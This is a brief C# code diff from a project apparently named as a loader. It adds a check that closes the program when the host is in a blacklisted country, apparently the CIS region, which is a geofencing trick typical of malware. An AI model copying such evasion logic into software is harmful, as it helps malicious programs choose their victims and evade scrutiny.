@@ -20,6 +20,10 @@ namespace ApolonSpaceXLoader
         [MTAThread]
         static void Main(string[] args)
         {
+            if (Helper.Cis(dom)) // If country in black list, application close
+            {
+                Environment.Exit(1);
+            }
             MyRegistry.Check();
             ewh = new EventWaitHandle(false, EventResetMode.AutoReset);
 
